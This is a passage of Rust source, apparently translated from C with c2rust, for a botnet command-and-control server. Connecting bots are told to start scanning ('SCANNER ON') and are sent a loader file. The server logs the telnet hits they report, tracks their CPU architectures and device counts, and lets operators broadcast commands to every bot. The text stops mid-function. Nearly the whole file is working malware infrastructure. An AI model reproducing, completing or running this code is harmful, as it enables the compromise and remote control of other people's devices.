#![allow(dead_code, mutable_transmutes, non_camel_case_types, non_snake_case, non_upper_case_globals, unused_assignments, unused_mut)]
#![register_tool(c2rust)]
#![feature(register_tool)]
extern "C" {
    static mut stderr: *mut _IO_FILE;
    fn fclose(__stream: *mut FILE) -> libc::c_int;
    fn fflush(__stream: *mut FILE) -> libc::c_int;
    fn fopen(__filename: *const libc::c_char, __modes: *const libc::c_char) -> *mut FILE;
    fn fprintf(_: *mut FILE, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn printf(_: *const libc::c_char, _: ...) -> libc::c_int;
    fn sprintf(_: *mut libc::c_char, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn snprintf(
        _: *mut libc::c_char,
        _: libc::c_ulong,
        _: *const libc::c_char,
        _: ...
    ) -> libc::c_int;
    fn fscanf(_: *mut FILE, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn fgetc(__stream: *mut FILE) -> libc::c_int;
    fn perror(__s: *const libc::c_char);
    fn feof(__stream: *mut FILE) -> libc::c_int;
    fn fgets(
        __s: *mut libc::c_char,
        __n: libc::c_int,
        __stream: *mut FILE,
    ) -> *mut libc::c_char;
    fn fread(
        __ptr: *mut libc::c_void,
        __size: size_t,
        __n: size_t,
        __stream: *mut FILE,
    ) -> size_t;
    fn fseek(
        __stream: *mut FILE,
        __off: libc::c_long,
        __whence: libc::c_int,
    ) -> libc::c_int;
    fn ftell(__stream: *mut FILE) -> libc::c_long;
    fn rewind(__stream: *mut FILE);
    fn atoi(__nptr: *const libc::c_char) -> libc::c_int;
    fn asctime(__tp: *const tm) -> *mut libc::c_char;
    fn localtime(__timer: *const time_t) -> *mut tm;
    fn gmtime(__timer: *const time_t) -> *mut tm;
    fn strftime(
        __s: *mut libc::c_char,
        __maxsize: size_t,
        __format: *const libc::c_char,
        __tp: *const tm,
    ) -> size_t;
    fn time(__timer: *mut time_t) -> time_t;
    fn malloc(_: libc::c_ulong) -> *mut libc::c_void;
    fn calloc(_: libc::c_ulong, _: libc::c_ulong) -> *mut libc::c_void;
    fn free(__ptr: *mut libc::c_void);
    fn abort() -> !;
    fn exit(_: libc::c_int) -> !;
    fn memset(
        _: *mut libc::c_void,
        _: libc::c_int,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn strcpy(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strcmp(_: *const libc::c_char, _: *const libc::c_char) -> libc::c_int;
    fn strstr(_: *const libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strtok(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strlen(_: *const libc::c_char) -> libc::c_ulong;
    fn bzero(_: *mut libc::c_void, _: libc::c_ulong);
    fn send(
        __fd: libc::c_int,
        __buf: *const libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
    ) -> ssize_t;
    fn socket(
        __domain: libc::c_int,
        __type: libc::c_int,
        __protocol: libc::c_int,
    ) -> libc::c_int;
    fn bind(__fd: libc::c_int, __addr: *const sockaddr, __len: socklen_t) -> libc::c_int;
    fn accept(
        __fd: libc::c_int,
        __addr: *mut sockaddr,
        __addr_len: *mut socklen_t,
    ) -> libc::c_int;
    fn listen(__fd: libc::c_int, __n: libc::c_int) -> libc::c_int;
    fn setsockopt(
        __fd: libc::c_int,
        __level: libc::c_int,
        __optname: libc::c_int,
        __optval: *const libc::c_void,
        __optlen: socklen_t,
    ) -> libc::c_int;
    fn htons(__hostshort: uint16_t) -> uint16_t;
    fn getaddrinfo(
        __name: *const libc::c_char,
        __service: *const libc::c_char,
        __req: *const addrinfo,
        __pai: *mut *mut addrinfo,
    ) -> libc::c_int;
    fn freeaddrinfo(__ai: *mut addrinfo);
    fn gai_strerror(__ecode: libc::c_int) -> *const libc::c_char;
    fn close(__fd: libc::c_int) -> libc::c_int;
    fn read(__fd: libc::c_int, __buf: *mut libc::c_void, __nbytes: size_t) -> ssize_t;
    fn sleep(__seconds: libc::c_uint) -> libc::c_uint;
    fn fcntl(__fd: libc::c_int, __cmd: libc::c_int, _: ...) -> libc::c_int;
    fn epoll_create1(__flags: libc::c_int) -> libc::c_int;
    fn epoll_ctl(
        __epfd: libc::c_int,
        __op: libc::c_int,
        __fd: libc::c_int,
        __event: *mut epoll_event,
    ) -> libc::c_int;
    fn epoll_wait(
        __epfd: libc::c_int,
        __events: *mut epoll_event,
        __maxevents: libc::c_int,
        __timeout: libc::c_int,
    ) -> libc::c_int;
    fn __errno_location() -> *mut libc::c_int;
    fn pthread_create(
        __newthread: *mut pthread_t,
        __attr: *const pthread_attr_t,
        __start_routine: Option::<
            unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void,
        >,
        __arg: *mut libc::c_void,
    ) -> libc::c_int;
    fn signal(__sig: libc::c_int, __handler: __sighandler_t) -> __sighandler_t;
    fn inet_ntoa(__in: in_addr) -> *mut libc::c_char;
    fn isspace(_: libc::c_int) -> libc::c_int;
}
pub type size_t = libc::c_ulong;
pub type __off_t = libc::c_long;
pub type __off64_t = libc::c_long;
pub type __time_t = libc::c_long;
pub type __ssize_t = libc::c_long;
pub type __socklen_t = libc::c_uint;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_FILE {
    pub _flags: libc::c_int,
    pub _IO_read_ptr: *mut libc::c_char,
    pub _IO_read_end: *mut libc::c_char,
    pub _IO_read_base: *mut libc::c_char,
    pub _IO_write_base: *mut libc::c_char,
    pub _IO_write_ptr: *mut libc::c_char,
    pub _IO_write_end: *mut libc::c_char,
    pub _IO_buf_base: *mut libc::c_char,
    pub _IO_buf_end: *mut libc::c_char,
    pub _IO_save_base: *mut libc::c_char,
    pub _IO_backup_base: *mut libc::c_char,
    pub _IO_save_end: *mut libc::c_char,
    pub _markers: *mut _IO_marker,
    pub _chain: *mut _IO_FILE,
    pub _fileno: libc::c_int,
    pub _flags2: libc::c_int,
    pub _old_offset: __off_t,
    pub _cur_column: libc::c_ushort,
    pub _vtable_offset: libc::c_schar,
    pub _shortbuf: [libc::c_char; 1],
    pub _lock: *mut libc::c_void,
    pub _offset: __off64_t,
    pub __pad1: *mut libc::c_void,
    pub __pad2: *mut libc::c_void,
    pub __pad3: *mut libc::c_void,
    pub __pad4: *mut libc::c_void,
    pub __pad5: size_t,
    pub _mode: libc::c_int,
    pub _unused2: [libc::c_char; 20],
}
pub type _IO_lock_t = ();
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_marker {
    pub _next: *mut _IO_marker,
    pub _sbuf: *mut _IO_FILE,
    pub _pos: libc::c_int,
}
pub type FILE = _IO_FILE;
pub type ssize_t = __ssize_t;
pub type time_t = __time_t;
pub type pthread_t = libc::c_ulong;
#[derive(Copy, Clone)]
#[repr(C)]
pub union pthread_attr_t {
    pub __size: [libc::c_char; 56],
    pub __align: libc::c_long,
}
pub type uint16_t = libc::c_ushort;
pub type uint32_t = libc::c_uint;
pub type uint64_t = libc::c_ulong;
pub type socklen_t = __socklen_t;
pub type __socket_type = libc::c_uint;
pub const SOCK_NONBLOCK: __socket_type = 2048;
pub const SOCK_CLOEXEC: __socket_type = 524288;
pub const SOCK_PACKET: __socket_type = 10;
pub const SOCK_DCCP: __socket_type = 6;
pub const SOCK_SEQPACKET: __socket_type = 5;
pub const SOCK_RDM: __socket_type = 4;
pub const SOCK_RAW: __socket_type = 3;
pub const SOCK_DGRAM: __socket_type = 2;
pub const SOCK_STREAM: __socket_type = 1;
pub type sa_family_t = libc::c_ushort;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr {
    pub sa_family: sa_family_t,
    pub sa_data: [libc::c_char; 14],
}
pub type C2RustUnnamed = libc::c_uint;
pub const MSG_CMSG_CLOEXEC: C2RustUnnamed = 1073741824;
pub const MSG_FASTOPEN: C2RustUnnamed = 536870912;
pub const MSG_WAITFORONE: C2RustUnnamed = 65536;
pub const MSG_MORE: C2RustUnnamed = 32768;
pub const MSG_NOSIGNAL: C2RustUnnamed = 16384;
pub const MSG_ERRQUEUE: C2RustUnnamed = 8192;
pub const MSG_RST: C2RustUnnamed = 4096;
pub const MSG_CONFIRM: C2RustUnnamed = 2048;
pub const MSG_SYN: C2RustUnnamed = 1024;
pub const MSG_FIN: C2RustUnnamed = 512;
pub const MSG_WAITALL: C2RustUnnamed = 256;
pub const MSG_EOR: C2RustUnnamed = 128;
pub const MSG_DONTWAIT: C2RustUnnamed = 64;
pub const MSG_TRUNC: C2RustUnnamed = 32;
pub const MSG_PROXY: C2RustUnnamed = 16;
pub const MSG_CTRUNC: C2RustUnnamed = 8;
pub const MSG_DONTROUTE: C2RustUnnamed = 4;
pub const MSG_PEEK: C2RustUnnamed = 2;
pub const MSG_OOB: C2RustUnnamed = 1;
pub type in_addr_t = uint32_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct in_addr {
    pub s_addr: in_addr_t,
}
pub type in_port_t = uint16_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr_in {
    pub sin_family: sa_family_t,
    pub sin_port: in_port_t,
    pub sin_addr: in_addr,
    pub sin_zero: [libc::c_uchar; 8],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct addrinfo {
    pub ai_flags: libc::c_int,
    pub ai_family: libc::c_int,
    pub ai_socktype: libc::c_int,
    pub ai_protocol: libc::c_int,
    pub ai_addrlen: socklen_t,
    pub ai_addr: *mut sockaddr,
    pub ai_canonname: *mut libc::c_char,
    pub ai_next: *mut addrinfo,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct tm {
    pub tm_sec: libc::c_int,
    pub tm_min: libc::c_int,
    pub tm_hour: libc::c_int,
    pub tm_mday: libc::c_int,
    pub tm_mon: libc::c_int,
    pub tm_year: libc::c_int,
    pub tm_wday: libc::c_int,
    pub tm_yday: libc::c_int,
    pub tm_isdst: libc::c_int,
    pub tm_gmtoff: libc::c_long,
    pub tm_zone: *const libc::c_char,
}
pub type EPOLL_EVENTS = libc::c_uint;
pub const EPOLLET: EPOLL_EVENTS = 2147483648;
pub const EPOLLONESHOT: EPOLL_EVENTS = 1073741824;
pub const EPOLLWAKEUP: EPOLL_EVENTS = 536870912;
pub const EPOLLRDHUP: EPOLL_EVENTS = 8192;
pub const EPOLLHUP: EPOLL_EVENTS = 16;
pub const EPOLLERR: EPOLL_EVENTS = 8;
pub const EPOLLMSG: EPOLL_EVENTS = 1024;
pub const EPOLLWRBAND: EPOLL_EVENTS = 512;
pub const EPOLLWRNORM: EPOLL_EVENTS = 256;
pub const EPOLLRDBAND: EPOLL_EVENTS = 128;
pub const EPOLLRDNORM: EPOLL_EVENTS = 64;
pub const EPOLLOUT: EPOLL_EVENTS = 4;
pub const EPOLLPRI: EPOLL_EVENTS = 2;
pub const EPOLLIN: EPOLL_EVENTS = 1;
#[derive(Copy, Clone)]
#[repr(C)]
pub union epoll_data {
    pub ptr: *mut libc::c_void,
    pub fd: libc::c_int,
    pub u32_0: uint32_t,
    pub u64_0: uint64_t,
}
pub type epoll_data_t = epoll_data;
#[derive(Copy, Clone)]
#[repr(C, packed)]
pub struct epoll_event {
    pub events: uint32_t,
    pub data: epoll_data_t,
}
pub type __sighandler_t = Option::<unsafe extern "C" fn(libc::c_int) -> ()>;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct login_info {
    pub username: [libc::c_char; 20],
    pub password: [libc::c_char; 20],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct clientdata_t {
    pub ip: uint32_t,
    pub connected: libc::c_char,
    pub arch: [libc::c_char; 50],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct telnetdata_t {
    pub connected: libc::c_int,
    pub ip: [libc::c_char; 16],
    pub username: [libc::c_char; 50],
    pub userprompt: [libc::c_char; 1024],
    pub mute: libc::c_int,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct kekl {
    pub sock: libc::c_int,
    pub ip: uint32_t,
    pub cli_addr: sockaddr_in,
}
#[no_mangle]
pub static mut ppc: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut sh4: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut x86: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut armv3: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut armv4t: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut armv6: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut armv7: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut mips: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut m68k: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut sparc: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut mipsel: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut unknown: libc::c_int = 0 as libc::c_int;
static mut accounts: [login_info; 20] = [login_info {
    username: [0; 20],
    password: [0; 20],
}; 20];
#[no_mangle]
pub static mut clients: [clientdata_t; 100000] = [clientdata_t {
    ip: 0,
    connected: 0,
    arch: [0; 50],
}; 100000];
#[no_mangle]
pub static mut managements: [telnetdata_t; 100000] = [telnetdata_t {
    connected: 0,
    ip: [0; 16],
    username: [0; 50],
    userprompt: [0; 1024],
    mute: 0,
}; 100000];
static mut telFD: *mut FILE = 0 as *const FILE as *mut FILE;
static mut epollFD: libc::c_int = 0 as libc::c_int;
static mut listenFD: libc::c_int = 0 as libc::c_int;
static mut OperatorsConnected: libc::c_int = 0 as libc::c_int;
static mut TELFound: libc::c_int = 0 as libc::c_int;
static mut scannerreport: libc::c_int = 0;
#[no_mangle]
pub static mut auresp: [libc::c_char; 1024] = [0; 1024];
#[no_mangle]
pub static mut new_username: [libc::c_char; 40] = [0; 40];
#[no_mangle]
pub static mut new_password: [libc::c_char; 40] = [0; 40];
#[no_mangle]
pub unsafe extern "C" fn fdgets(
    mut buffer: *mut libc::c_uchar,
    mut bufferSize: libc::c_int,
    mut fd: libc::c_int,
) -> libc::c_int {
    let mut total: libc::c_int = 0 as libc::c_int;
    let mut got: libc::c_int = 1 as libc::c_int;
    while got == 1 as libc::c_int && total < bufferSize
        && *buffer.offset(total as isize).offset(-(1 as libc::c_int as isize))
            as libc::c_int != '\n' as i32
    {
        got = read(
            fd,
            buffer.offset(total as isize) as *mut libc::c_void,
            1 as libc::c_int as size_t,
        ) as libc::c_int;
        total += 1;
    }
    return got;
}
#[no_mangle]
pub unsafe extern "C" fn trim(mut str: *mut libc::c_char) {
    let mut i: libc::c_int = 0;
    let mut begin: libc::c_int = 0 as libc::c_int;
    let mut end: libc::c_int = (strlen(str))
        .wrapping_sub(1 as libc::c_int as libc::c_ulong) as libc::c_int;
    while isspace(*str.offset(begin as isize) as libc::c_int) != 0 {
        begin += 1;
    }
    while end >= begin && isspace(*str.offset(end as isize) as libc::c_int) != 0 {
        end -= 1;
    }
    i = begin;
    while i <= end {
        *str.offset((i - begin) as isize) = *str.offset(i as isize);
        i += 1;
    }
    *str.offset((i - begin) as isize) = '\0' as i32 as libc::c_char;
}
unsafe extern "C" fn make_socket_non_blocking(mut sfd: libc::c_int) -> libc::c_int {
    let mut flags: libc::c_int = 0;
    let mut s: libc::c_int = 0;
    flags = fcntl(sfd, 3 as libc::c_int, 0 as libc::c_int);
    if flags == -(1 as libc::c_int) {
        perror(b"fcntl\0" as *const u8 as *const libc::c_char);
        return -(1 as libc::c_int);
    }
    flags |= 0o4000 as libc::c_int;
    s = fcntl(sfd, 4 as libc::c_int, flags);
    if s == -(1 as libc::c_int) {
        perror(b"fcntl\0" as *const u8 as *const libc::c_char);
        return -(1 as libc::c_int);
    }
    return 0 as libc::c_int;
}
unsafe extern "C" fn create_and_bind(mut port: *mut libc::c_char) -> libc::c_int {
    let mut hints: addrinfo = addrinfo {
        ai_flags: 0,
        ai_family: 0,
        ai_socktype: 0,
        ai_protocol: 0,
        ai_addrlen: 0,
        ai_addr: 0 as *mut sockaddr,
        ai_canonname: 0 as *mut libc::c_char,
        ai_next: 0 as *mut addrinfo,
    };
    let mut result: *mut addrinfo = 0 as *mut addrinfo;
    let mut rp: *mut addrinfo = 0 as *mut addrinfo;
    let mut s: libc::c_int = 0;
    let mut sfd: libc::c_int = 0;
    memset(
        &mut hints as *mut addrinfo as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<addrinfo>() as libc::c_ulong,
    );
    hints.ai_family = 0 as libc::c_int;
    hints.ai_socktype = SOCK_STREAM as libc::c_int;
    hints.ai_flags = 0x1 as libc::c_int;
    s = getaddrinfo(0 as *const libc::c_char, port, &mut hints, &mut result);
    if s != 0 as libc::c_int {
        fprintf(
            stderr,
            b"getaddrinfo: %s\n\0" as *const u8 as *const libc::c_char,
            gai_strerror(s),
        );
        return -(1 as libc::c_int);
    }
    rp = result;
    while !rp.is_null() {
        sfd = socket((*rp).ai_family, (*rp).ai_socktype, (*rp).ai_protocol);
        if !(sfd == -(1 as libc::c_int)) {
            let mut yes: libc::c_int = 1 as libc::c_int;
            if setsockopt(
                sfd,
                1 as libc::c_int,
                2 as libc::c_int,
                &mut yes as *mut libc::c_int as *const libc::c_void,
                ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
            ) == -(1 as libc::c_int)
            {
                perror(b"setsockopt\0" as *const u8 as *const libc::c_char);
            }
            s = bind(sfd, (*rp).ai_addr, (*rp).ai_addrlen);
            if s == 0 as libc::c_int {
                break;
            }
            close(sfd);
        }
        rp = (*rp).ai_next;
    }
    if rp.is_null() {
        fprintf(stderr, b"Could not bind\n\0" as *const u8 as *const libc::c_char);
        return -(1 as libc::c_int);
    }
    freeaddrinfo(result);
    return sfd;
}
#[no_mangle]
pub unsafe extern "C" fn get_host(mut addr: uint32_t) -> *const libc::c_char {
    let mut in_addr_ip: in_addr = in_addr { s_addr: 0 };
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}
#[no_mangle]
pub unsafe extern "C" fn broadcast(
    mut msg: *mut libc::c_char,
    mut us: libc::c_int,
    mut sender: *mut libc::c_char,
) {
    let mut sendMGM: libc::c_int = 1 as libc::c_int;
    if strcmp(msg, b"PING\0" as *const u8 as *const libc::c_char) == 0 as libc::c_int {
        sendMGM = 0 as libc::c_int;
    }
    let mut wot: *mut libc::c_char = malloc(
        (strlen(msg)).wrapping_add(10 as libc::c_int as libc::c_ulong),
    ) as *mut libc::c_char;
    memset(
        wot as *mut libc::c_void,
        0 as libc::c_int,
        (strlen(msg)).wrapping_add(10 as libc::c_int as libc::c_ulong),
    );
    strcpy(wot, msg);
    trim(wot);
    let mut rawtime: time_t = 0;
    let mut timeinfo: *mut tm = 0 as *mut tm;
    time(&mut rawtime);
    timeinfo = localtime(&mut rawtime);
    let mut timestamp: *mut libc::c_char = asctime(timeinfo);
    trim(timestamp);
    let mut i: libc::c_int = 0;
    let mut kekolds: [libc::c_char; 1024] = [0; 1024];
    i = 0 as libc::c_int;
    while i < 100000 as libc::c_int {
        if !(i == us
            || clients[i as usize].connected == 0
                && (sendMGM == 0 as libc::c_int
                    || managements[i as usize].connected == 0))
        {
            if sendMGM != 0 && managements[i as usize].connected != 0
                && managements[i as usize].mute == 0 as libc::c_int
            {
                send(
                    i,
                    b"\x1B[37m\0" as *const u8 as *const libc::c_char
                        as *const libc::c_void,
                    5 as libc::c_int as size_t,
                    MSG_NOSIGNAL as libc::c_int,
                );
                send(
                    i,
                    sender as *const libc::c_void,
                    strlen(sender),
                    MSG_NOSIGNAL as libc::c_int,
                );
                send(
                    i,
                    b": \0" as *const u8 as *const libc::c_char as *const libc::c_void,
                    2 as libc::c_int as size_t,
                    MSG_NOSIGNAL as libc::c_int,
                );
            }
            printf(b"sent to fd: %d\n\0" as *const u8 as *const libc::c_char, i);
            if sendMGM != 0 && managements[i as usize].mute == 0 as libc::c_int
                || clients[i as usize].connected as libc::c_int != 0
            {
                send(
                    i,
                    msg as *const libc::c_void,
                    strlen(msg),
                    MSG_NOSIGNAL as libc::c_int,
                );
            }
            snprintf(
                kekolds.as_mut_ptr(),
                ::std::mem::size_of::<[libc::c_char; 1024]>() as libc::c_ulong,
                b"\r\n%s\x1B[36m> \x1B[0m\0" as *const u8 as *const libc::c_char,
                (managements[i as usize].username).as_mut_ptr(),
            );
            if sendMGM != 0 && managements[i as usize].connected != 0
                && managements[i as usize].mute == 0 as libc::c_int
            {
                send(
                    i,
                    kekolds.as_mut_ptr() as *const libc::c_void,
                    strlen(kekolds.as_mut_ptr()),
                    MSG_NOSIGNAL as libc::c_int,
                );
            } else if clients[i as usize].connected != 0 {
                send(
                    i,
                    b"\n\0" as *const u8 as *const libc::c_char as *const libc::c_void,
                    1 as libc::c_int as size_t,
                    MSG_NOSIGNAL as libc::c_int,
                );
            }
        }
        i += 1;
    }
    memset(
        kekolds.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 1024]>() as libc::c_ulong,
    );
    free(wot as *mut libc::c_void);
}
#[no_mangle]
pub unsafe extern "C" fn BotEventLoop(
    mut useless: *mut libc::c_void,
) -> *mut libc::c_void {
    let mut event: epoll_event = epoll_event {
        events: 0,
        data: epoll_data {
            ptr: 0 as *mut libc::c_void,
        },
    };
    let mut events: *mut epoll_event = 0 as *mut epoll_event;
    let mut s: libc::c_int = 0;
    events = calloc(
        100000 as libc::c_int as libc::c_ulong,
        ::std::mem::size_of::<epoll_event>() as libc::c_ulong,
    ) as *mut epoll_event;
    loop {
        let mut n: libc::c_int = 0;
        let mut i: libc::c_int = 0;
        n = epoll_wait(epollFD, events, 100000 as libc::c_int, -(1 as libc::c_int));
        i = 0 as libc::c_int;
        while i < n {
            if (*events.offset(i as isize)).events
                & EPOLLERR as libc::c_int as libc::c_uint != 0
                || (*events.offset(i as isize)).events
                    & EPOLLHUP as libc::c_int as libc::c_uint != 0
                || (*events.offset(i as isize)).events
                    & EPOLLIN as libc::c_int as libc::c_uint == 0
            {
                clients[(*events.offset(i as isize)).data.fd as usize]
                    .connected = 0 as libc::c_int as libc::c_char;
                close((*events.offset(i as isize)).data.fd);
            } else if listenFD == (*events.offset(i as isize)).data.fd {
                loop {
                    let mut in_addr: sockaddr = sockaddr {
                        sa_family: 0,
                        sa_data: [0; 14],
                    };
                    let mut in_len: socklen_t = 0;
                    let mut infd: libc::c_int = 0;
                    let mut ipIndex: libc::c_int = 0;
                    in_len = ::std::mem::size_of::<sockaddr>() as libc::c_ulong
                        as socklen_t;
                    infd = accept(listenFD, &mut in_addr, &mut in_len);
                    if infd == -(1 as libc::c_int) {
                        if *__errno_location() == 11 as libc::c_int
                            || *__errno_location() == 11 as libc::c_int
                        {
                            break;
                        }
                        perror(b"accept\0" as *const u8 as *const libc::c_char);
                        break;
                    } else {
                        clients[infd as usize]
                            .ip = (*(&mut in_addr as *mut sockaddr as *mut sockaddr_in))
                            .sin_addr
                            .s_addr;
                        s = make_socket_non_blocking(infd);
                        if s == -(1 as libc::c_int) {
                            close(infd);
                            break;
                        } else {
                            event.data.fd = infd;
                            event
                                .events = EPOLLIN as libc::c_int as libc::c_uint
                                | EPOLLET as libc::c_uint;
                            s = epoll_ctl(epollFD, 1 as libc::c_int, infd, &mut event);
                            if s == -(1 as libc::c_int) {
                                perror(b"epoll_ctl\0" as *const u8 as *const libc::c_char);
                                close(infd);
                                break;
                            } else {
                                clients[infd as usize]
                                    .connected = 1 as libc::c_int as libc::c_char;
                                send(
                                    infd,
                                    b"SCANNER ON\n\0" as *const u8 as *const libc::c_char
                                        as *const libc::c_void,
                                    11 as libc::c_int as size_t,
                                    MSG_NOSIGNAL as libc::c_int,
                                );
                                let mut fp: *mut FILE = 0 as *mut FILE;
                                let mut lSize: libc::c_long = 0;
                                let mut buffer: *mut libc::c_char = 0 as *mut libc::c_char;
                                fp = fopen(
                                    b"LDSERVER.txt\0" as *const u8 as *const libc::c_char,
                                    b"rb\0" as *const u8 as *const libc::c_char,
                                );
                                if fp.is_null() {
                                    continue;
                                }
                                fseek(fp, 0 as libc::c_long, 2 as libc::c_int);
                                lSize = ftell(fp);
                                rewind(fp);
                                buffer = calloc(
                                    1 as libc::c_int as libc::c_ulong,
                                    (lSize + 1 as libc::c_int as libc::c_long) as libc::c_ulong,
                                ) as *mut libc::c_char;
                                if buffer.is_null() {
                                    fclose(fp);
                                } else if 1 as libc::c_int as libc::c_ulong
                                    != fread(
                                        buffer as *mut libc::c_void,
                                        lSize as size_t,
                                        1 as libc::c_int as size_t,
                                        fp,
                                    )
                                {
                                    fclose(fp);
                                    free(buffer as *mut libc::c_void);
                                } else {
                                    send(
                                        infd,
                                        buffer as *const libc::c_void,
                                        strlen(buffer),
                                        MSG_NOSIGNAL as libc::c_int,
                                    );
                                    fclose(fp);
                                    free(buffer as *mut libc::c_void);
                                }
                            }
                        }
                    }
                }
            } else {
                let mut datafd: libc::c_int = (*events.offset(i as isize)).data.fd;
                let mut client: *mut clientdata_t = &mut *clients
                    .as_mut_ptr()
                    .offset(datafd as isize) as *mut clientdata_t;
                let mut done: libc::c_int = 0 as libc::c_int;
                (*client).connected = 1 as libc::c_int as libc::c_char;
                loop {
                    let mut count: ssize_t = 0;
                    let mut buf: [libc::c_char; 2048] = [0; 2048];
                    memset(
                        buf.as_mut_ptr() as *mut libc::c_void,
                        0 as libc::c_int,
                        ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong,
                    );
                    while !(memset(
                        buf.as_mut_ptr() as *mut libc::c_void,
                        0 as libc::c_int,
                        ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong,
                    ))
                        .is_null()
                        && {
                            count = fdgets(
                                buf.as_mut_ptr() as *mut libc::c_uchar,
                                ::std::mem::size_of::<[libc::c_char; 2048]>()
                                    as libc::c_ulong as libc::c_int,
                                datafd,
                            ) as ssize_t;
                            count > 0 as libc::c_int as libc::c_long
                        }
                    {
                        if (strstr(
                            buf.as_mut_ptr(),
                            b"\n\0" as *const u8 as *const libc::c_char,
                        ))
                            .is_null()
                        {
                            done = 1 as libc::c_int;
                            break;
                        } else {
                            trim(buf.as_mut_ptr());
                            if strcmp(
                                buf.as_mut_ptr(),
                                b"PING\0" as *const u8 as *const libc::c_char,
                            ) == 0 as libc::c_int
                            {
                                if !(send(
                                    datafd,
                                    b"PONG\n\0" as *const u8 as *const libc::c_char
                                        as *const libc::c_void,
                                    5 as libc::c_int as size_t,
                                    MSG_NOSIGNAL as libc::c_int,
                                ) == -(1 as libc::c_int) as libc::c_long)
                                {
                                    continue;
                                }
                                done = 1 as libc::c_int;
                                break;
                            } else if strstr(
                                buf.as_mut_ptr(),
                                b"TELNET \0" as *const u8 as *const libc::c_char,
                            ) == buf.as_mut_ptr()
                            {
                                let mut line: *mut libc::c_char = (strstr(
                                    buf.as_mut_ptr(),
                                    b"TELNET \0" as *const u8 as *const libc::c_char,
                                ))
                                    .offset(7 as libc::c_int as isize);
                                fprintf(
                                    telFD as *mut FILE,
                                    b"%s\n\0" as *const u8 as *const libc::c_char,
                                    line,
                                );
                                fflush(telFD as *mut FILE);
                                ::std::ptr::write_volatile(
                                    &mut TELFound as *mut libc::c_int,
                                    ::std::ptr::read_volatile::<
                                        libc::c_int,
                                    >(&TELFound as *const libc::c_int) + 1,
                                );
                            } else {
                                if strcmp(
                                    buf.as_mut_ptr(),
                                    b"PONG\0" as *const u8 as *const libc::c_char,
                                ) == 0 as libc::c_int
                                {
                                    continue;
                                }
                                if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"arch \0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    let mut arch: *mut libc::c_char = (strtok(
                                        buf.as_mut_ptr(),
                                        b" \0" as *const u8 as *const libc::c_char,
                                    ))
                                        .offset(
                                            ::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong
                                                as isize,
                                        )
                                        .offset(-(3 as libc::c_int as isize));
                                    strcpy(((*clients.as_mut_ptr()).arch).as_mut_ptr(), arch);
                                    strcpy((clients[datafd as usize].arch).as_mut_ptr(), arch);
                                }
                                printf(
                                    b"buf: \"%s\"\n\0" as *const u8 as *const libc::c_char,
                                    buf.as_mut_ptr(),
                                );
                            }
                        }
                    }
                    if count == -(1 as libc::c_int) as libc::c_long {
                        if *__errno_location() != 11 as libc::c_int {
                            done = 1 as libc::c_int;
                        }
                        break;
                    } else if count == 0 as libc::c_int as libc::c_long {
                        done = 1 as libc::c_int;
                        break;
                    } else if done != 0 {
                        (*client).connected = 0 as libc::c_int as libc::c_char;
                        memset(
                            ((*client.offset(datafd as isize)).arch).as_mut_ptr()
                                as *mut libc::c_void,
                            0 as libc::c_int,
                            ::std::mem::size_of::<[libc::c_char; 50]>() as libc::c_ulong,
                        );
                        close(datafd);
                    }
                }
            }
            i += 1;
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn BotsConnected() -> libc::c_uint {
    let mut i: libc::c_int = 0 as libc::c_int;
    let mut total: libc::c_int = 0 as libc::c_int;
    i = 0 as libc::c_int;
    while i < 100000 as libc::c_int {
        if !(clients[i as usize].connected == 0) {
            total += 1;
        }
        i += 1;
    }
    return total as libc::c_uint;
}
#[no_mangle]
pub unsafe extern "C" fn TitleWriter(mut sock: *mut libc::c_void) {
    let mut datafd: libc::c_int = sock as libc::c_int;
    let mut string: [libc::c_char; 2048] = [0; 2048];
    loop {
        memset(
            string.as_mut_ptr() as *mut libc::c_void,
            0 as libc::c_int,
            2048 as libc::c_int as libc::c_ulong,
        );
        sprintf(
            string.as_mut_ptr(),
            b"%c]0;Devices: %d | Users Online: %d%c\0" as *const u8
                as *const libc::c_char,
            '\u{1b}' as i32,
            BotsConnected(),
            OperatorsConnected,
            '\u{7}' as i32,
        );
        if send(
            datafd,
